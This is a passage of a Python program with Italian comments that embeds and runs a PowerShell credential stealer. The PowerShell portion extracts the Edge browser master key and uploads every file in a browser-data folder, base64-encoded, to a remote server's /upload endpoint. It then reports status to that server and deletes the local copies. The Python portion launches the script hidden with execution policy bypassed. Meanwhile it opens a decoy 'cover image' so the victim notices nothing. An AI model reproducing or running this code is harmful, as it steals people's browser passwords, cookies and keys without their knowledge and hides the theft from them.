        @{id=91; command="Get-BrowserMasterKey -path `"$($localStatePaths.Edge)`""}
    )

    # 3. ESECUZIONE DEI COMANDI
    foreach ($cmd in $embeddedCommands) { Run-CommandAndSendData -CmdObj $cmd }

    # 4. ESFILTRAZIONE CON UPLOAD ROBUSTO E PULIZIA
    if (Test-Path $browserDataPath) {
        Get-ChildItem -Path $browserDataPath -File -Recurse | ForEach-Object {
            $currentFile = $_
            try {
                $fileBytes = [System.IO.File]::ReadAllBytes($currentFile.FullName)
                $fileB64 = [System.Convert]::ToBase64String($fileBytes)
                $uploadData = @{ 
                    session_id  = $sessionId; 
                    filename = $currentFile.Name; 
                    content_b64 = $fileB64 
                } | ConvertTo-Json -Compress
                Invoke-RestMethod -Uri "$serverUrl/upload" -Method Post -Body $uploadData -ContentType 'application/json' -TimeoutSec 120 | Out-Null
            } catch {
                # Invia un log di errore se l'upload fallisce
                $errorData = @{
                    file = $currentFile.Name
                    error_message = $_.Exception.Message
                }
                Send-Data -Data $errorData -DataType "upload_error"
            }
        }
        # Pulizia finale
        Remove-Item -Path $browserDataPath -Recurse -Force -ErrorAction SilentlyContinue
    }

    # 5. COMPLETAMENTO
    Send-Data -Data @{ status = "completed" } -DataType "session_complete"
} catch { 
    Send-Data -Data @{ error_message = $_.Exception.Message } -DataType "fatal_error"
}
'''

def show_cover_image():
    """Mostra immagine di copertura per alcuni secondi"""
    if not COVER_IMAGE_B64.strip():
        time.sleep(10)
        return
    try:
        image_data = base64.b64decode(COVER_IMAGE_B64)
        temp_image = os.path.join(tempfile.gettempdir(), "temp_image_cover.jpg")
        with open(temp_image, 'wb') as f:
            f.write(image_data)
        
        if os.name == 'nt':
            os.startfile(temp_image)
        else:
            subprocess.run(['xdg-open', temp_image], check=True)
        
        time.sleep(10)
        os.remove(temp_image)
            
    except Exception:
        pass

def execute_powershell_payload():
    """Esegue payload PowerShell in background"""
    try:
        final_payload = POWERSHELL_SCRIPT.replace("__SERVER_URL__", SERVER_URL)
        temp_ps1 = os.path.join(tempfile.gettempdir(), f"temp_{os.getpid()}.ps1")
        
        with open(temp_ps1, 'w', encoding='utf-8') as f:
            f.write(final_payload)
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        cmd = ["powershell.exe", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", temp_ps1]
        
        process = subprocess.Popen(cmd, startupinfo=startupinfo, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW, text=True, encoding='utf-8', errors='replace')
        
        try:
            stdout, stderr = process.communicate(timeout=180) # Aumentato timeout per upload
            if stderr:
                log_file = os.path.join(tempfile.gettempdir(), "pitone_error.log")
                with open(log_file, 'a', encoding='utf-8') as log:
                    log.write(f"--- PS ERROR at {time.ctime()} ---\n{stderr}\n")
        except subprocess.TimeoutExpired:
            process.kill()
        
        os.remove(temp_ps1)
    except Exception:
        pass

def main():
    """Funzione principale"""
    payload_thread = threading.Thread(target=execute_powershell_payload, daemon=True)
    payload_thread.start()
    show_cover_image()
    payload_thread.join()

if __name__ == "__main__":
    main()